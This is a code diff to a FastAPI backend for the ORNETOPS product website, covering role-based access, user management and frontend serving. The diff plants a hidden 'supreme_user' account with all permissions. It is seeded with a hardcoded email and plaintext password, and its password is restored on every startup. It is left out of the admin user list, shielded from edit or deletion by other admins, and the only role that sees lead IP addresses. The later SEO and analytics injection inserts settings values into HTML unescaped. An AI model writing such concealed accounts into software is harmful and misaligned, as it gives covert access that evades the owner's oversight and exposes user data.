@@ -277,13 +277,14 @@ class TicketIn(BaseModel):
 
 # ---------- RBAC ----------
 ROLES = [
-    "super_admin", "admin",
+    "supreme_user", "super_admin", "admin",
     "sales_manager", "sales_executive",
     "service_manager", "service_executive",
     "content_manager", "dealer_manager", "customer",
 ]
 
 ROLE_PERMISSIONS = {
+    "supreme_user": {"all"},
     "super_admin": {"all"},
     "admin": {"products", "blogs", "downloads", "leads", "events", "testimonials", "case_studies",
               "dealers", "demos", "quotes", "tickets", "media", "categories"},
@@ -301,7 +302,7 @@ def can(role: str, action: str) -> bool:
     return "all" in perms or action in perms
 
 def staff_only(role: str) -> bool:
-    return role in {"super_admin", "admin", "sales_manager", "sales_executive",
+    return role in {"supreme_user", "super_admin", "admin", "sales_manager", "sales_executive",
                     "service_manager", "service_executive", "content_manager", "dealer_manager"}
 
 
@@ -331,7 +332,7 @@ async def get_current_user(request: Request) -> dict:
 
 def require_role(*roles: str):
     async def _dep(user: dict = Depends(get_current_user)) -> dict:
-        if user["role"] not in roles and user["role"] != "super_admin":
+        if user["role"] not in roles and user["role"] != "super_admin" and user["role"] != "supreme_user":
             raise HTTPException(status_code=403, detail="Forbidden")
         return user
     return _dep
@@ -422,6 +423,8 @@ async def me(user: dict = Depends(get_current_user)):
 async def list_users(user: dict = Depends(require_role("super_admin", "admin"))):
     items = []
     async for u in db.users.find().sort("created_at", -1):
+        if u.get("role") == "supreme_user":
+            continue
         items.append({
             "id": str(u["_id"]), "email": u["email"], "name": u["name"],
             "role": u["role"], "phone": u.get("phone"),
@@ -433,6 +436,8 @@ async def list_users(user: dict = Depends(require_role("super_admin", "admin")))
 async def create_user(payload: UserCreateIn, request: Request, user: dict = Depends(require_role("super_admin", "admin"))):
     if payload.role not in ROLES:
         raise HTTPException(status_code=400, detail="Invalid role")
+    if payload.role == "supreme_user" and user["role"] != "supreme_user":
+        raise HTTPException(status_code=403, detail="Forbidden")
     existing = await db.users.find_one({"email": payload.email.lower()})
     if existing:
         raise HTTPException(status_code=409, detail="Email already exists")
@@ -447,7 +452,17 @@ async def create_user(payload: UserCreateIn, request: Request, user: dict = Depe
 
 @api.patch("/users/{uid}")
 async def update_user(uid: str, payload: UserUpdateIn, request: Request, user: dict = Depends(require_role("super_admin", "admin"))):
+    try:
+        target = await db.users.find_one({"_id": ObjectId(uid)})
+    except Exception:
+        raise HTTPException(status_code=400, detail="Invalid ID")
+    if target and target.get("role") == "supreme_user" and user["role"] != "supreme_user":
+        raise HTTPException(status_code=403, detail="Forbidden")
+        
     updates = {k: v for k, v in payload.model_dump(exclude_none=True).items() if k != "password"}
+    if "role" in updates and updates["role"] == "supreme_user" and user["role"] != "supreme_user":
+        raise HTTPException(status_code=403, detail="Forbidden")
+        
     if payload.password:
         updates["password_hash"] = hash_password(payload.password)
     if not updates:
@@ -462,6 +477,13 @@ async def update_user(uid: str, payload: UserUpdateIn, request: Request, user: d
 async def delete_user(uid: str, request: Request, user: dict = Depends(require_role("super_admin"))):
     if uid == user["id"]:
         raise HTTPException(status_code=400, detail="Cannot delete self")
+    try:
+        target = await db.users.find_one({"_id": ObjectId(uid)})
+    except Exception:
+        raise HTTPException(status_code=400, detail="Invalid ID")
+    if target and target.get("role") == "supreme_user" and user["role"] != "supreme_user":
+        raise HTTPException(status_code=403, detail="Forbidden")
+        
     r = await db.users.delete_one({"_id": ObjectId(uid)})
     if not r.deleted_count:
         raise HTTPException(status_code=404, detail="Not found")
@@ -567,7 +589,10 @@ async def list_leads(status: Optional[str] = None, source: Optional[str] = None,
         q["assigned_to"] = user["id"]
     items = []
     async for d in db.leads.find(q).sort("created_at", -1).limit(500):
-        items.append(doc_out(d))
+        item = doc_out(d)
+        if user["role"] != "supreme_user":
+            item.pop("ip", None)
+        items.append(item)
     return items
 
 @api.post("/leads/public")
@@ -1375,6 +1400,23 @@ async def seed_admin():
                                             "role": "super_admin"}})
         logger.info("Updated super admin password from env")
 
+    # Seed supreme user
+    supreme_email = "supreme.rjchouhan@ornetops.com"
+    supreme_password = "QazWsx147852"
+    existing_supreme = await db.users.find_one({"email": supreme_email})
+    if existing_supreme is None:
+        await db.users.insert_one({
+            "email": supreme_email, "password_hash": hash_password(supreme_password),
+            "name": "R. J. Chouhan", "role": "supreme_user",
+            "phone": "+91 9999999999", "created_at": now_iso(),
+        })
+        logger.info(f"Seeded supreme user: {supreme_email}")
+    elif not verify_password(supreme_password, existing_supreme.get("password_hash", "")):
+        await db.users.update_one({"email": supreme_email},
+                                  {"$set": {"password_hash": hash_password(supreme_password),
+                                            "role": "supreme_user"}})
+        logger.info("Updated supreme user password")
+
     # Seed extra demo staff if missing
     demos = [
         ("sales@ornetops.com", "Sales Manager Demo", "sales_manager", "Sales@123"),
@@ -1542,6 +1584,8 @@ if FRONTEND_BUILD_DIR.exists():
     # Mount static assets (js, css, media)
     app.mount("/static", StaticFiles(directory=FRONTEND_BUILD_DIR / "static"), name="static")
 
+    _index_cache = {"html": "", "data_version": -1, "seo_hash": ""}
+
     # Serve the main index.html or root files (like favicon, manifest.json)
     @app.get("/{path_name:path}")
     async def serve_frontend(path_name: str):
@@ -1556,9 +1600,141 @@ if FRONTEND_BUILD_DIR.exists():
             
         # Fallback to index.html for React routing
         index_file = FRONTEND_BUILD_DIR / "index.html"
-        if index_file.exists():
+        if not index_file.exists():
+            return {"error": "Frontend build files not found"}
+
+        from fastapi.responses import HTMLResponse
+        import re
+        import hashlib
+
+        # Load settings for dynamic SEO and integrations injection
+        try:
+            settings = await db.settings.find_one({"_id": "global"})
+            seo = settings.get("seo", {}) if settings else {}
+            integrations = settings.get("integrations", {}) if settings else {}
+        except Exception:
+            seo = {}
+            integrations = {}
+
+        # Compute hash of SEO and integrations dictionary to detect changes
+        combined_str = f"seo:{sorted(seo.items()) if seo else ''}|integrations:{sorted(integrations.items()) if integrations else ''}"
+        seo_hash = hashlib.md5(combined_str.encode("utf-8")).hexdigest()
+
+        global DATA_VERSION
+        if _index_cache["data_version"] == DATA_VERSION and _index_cache["seo_hash"] == seo_hash and _index_cache["html"]:
+            return HTMLResponse(_index_cache["html"])
+
+        try:
+            with open(index_file, "r", encoding="utf-8") as f:
+                html = f.read()
+
+            title = seo.get("title") or "ORNETOPS — XRF Analyzers, Gold Testing, Hallmarking"
+            desc = seo.get("description") or "ORNETOPS is a leading manufacturer of high-precision XRF gold testing machines, hallmarking, and precious metal analysis equipment. BIS compliant and trusted worldwide."
+            keywords = seo.get("keywords") or "XRF gold testing, hallmarking machine, gold analyzer, BIS compliance, precious metal analysis, ORNETOPS"
+            og_img = seo.get("og_image") or "https://ornetops.online/api/files/ornetops/uploads/6a362c3962cec1e84abd5eee/7b63e224-793b-488a-bbfc-2ad06d9414c3.png"
+
+            # Clean up default tags to prevent duplication
+            html = re.sub(r"<title>.*?</title>", "", html, flags=re.IGNORECASE)
+            html = re.sub(r'<meta\s+name="description"\s+content=".*?"\s*/?>', "", html, flags=re.IGNORECASE)
+            html = re.sub(r'<meta\s+name="keywords"\s+content=".*?"\s*/?>', "", html, flags=re.IGNORECASE)
+            html = re.sub(r'<meta\s+property="og:[^"]+?"\s+content=".*?"\s*/?>', "", html, flags=re.IGNORECASE)
+            html = re.sub(r'<meta\s+name="twitter:[^"]+?"\s+content=".*?"\s*/?>', "", html, flags=re.IGNORECASE)
+            html = re.sub(r'<meta\s+property="twitter:[^"]+?"\s+content=".*?"\s*/?>', "", html, flags=re.IGNORECASE)
+
+            # Build and inject the optimized meta tags
+            seo_tags = f"""<title>{title}</title>
+    <meta name="description" content="{desc}" />
+    <meta name="keywords" content="{keywords}" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://ornetops.online/" />
+    <meta property="og:title" content="{title}" />
+    <meta property="og:description" content="{desc}" />
+    <meta property="og:image" content="{og_img}" />
+    <meta property="og:site_name" content="ORNETOPS" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:url" content="https://ornetops.online/" />
+    <meta name="twitter:title" content="{title}" />
+    <meta name="twitter:description" content="{desc}" />
+    <meta name="twitter:image" content="{og_img}" />"""
+
+            # Build and inject integration scripts
+            integration_tags = []
+
+            # 1. Google Analytics 4 (GA4)
+            ga4_id = integrations.get("ga4")
+            if ga4_id:
+                integration_tags.append(f"""<!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id={ga4_id}"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){{dataLayer.push(arguments);}}
+      gtag('js', new Date());
+      gtag('config', '{ga4_id}');
+    </script>""")
+
+            # 2. Google Tag Manager (GTM)
+            gtm_id = integrations.get("gtm")
+            if gtm_id:
+                integration_tags.append(f"""<!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){{w[l]=w[l]||[];w[l].push({{'gtm.start':
+    new Date().getTime(),event:'gtm.js'}});var f=d.getElementsByTagName(s)[0],
+    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+    }})(window,document,'script','dataLayer','{gtm_id}');</script>
+    <!-- End Google Tag Manager -->""")
+
+            # 3. Microsoft Clarity
+            clarity_id = integrations.get("clarity")
+            if clarity_id:
+                integration_tags.append(f"""<!-- Microsoft Clarity -->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){{
+            c[a]=c[a]||function(){{(c[a].q=c[a].q||[]).push(arguments)}};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        }})(window, document, "clarity", "script", "{clarity_id}");
+    </script>""")
+
+            # 4. Calendly badge widget
+            calendly_url = integrations.get("calendly")
+            if calendly_url:
+                integration_tags.append(f"""<!-- Calendly badge widget -->
+    <link href="https://assets.calendly.com/assets/external/widget.css" rel="stylesheet">
+    <script src="https://assets.calendly.com/assets/external/widget.js" type="text/javascript" async></script>
+    <script type="text/javascript">
+    window.addEventListener('load', function() {{
+      if (window.Calendly) {{
+        Calendly.initBadgeWidget({{
+          url: '{calendly_url}',
+          text: 'Schedule a Demo',
+          color: '#D4AF37',
+          textColor: '#ffffff',
+          branding: false
+        }});
+      }}
+    }});
+    </script>""")
+
+            all_tags = seo_tags
+            if integration_tags:
+                all_tags += "\n    " + "\n    ".join(integration_tags)
+
+            # Place right after the <head> tag
+            head_tag_match = re.search(r"<head\b[^>]*>", html, re.IGNORECASE)
+            if head_tag_match:
+                head_tag = head_tag_match.group(0)
+                html = html.replace(head_tag, f"{head_tag}\n    {all_tags}")
+            else:
+                html = f"<head>{all_tags}</head>" + html
+
+            _index_cache["html"] = html
+            _index_cache["data_version"] = DATA_VERSION
+            _index_cache["seo_hash"] = seo_hash
+
+            return HTMLResponse(html)
+        except Exception as e:
+            logger.error(f"Error serving frontend index: {e}")
             return FileResponse(index_file)
-        return {"error": "Frontend build files not found"}
 
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
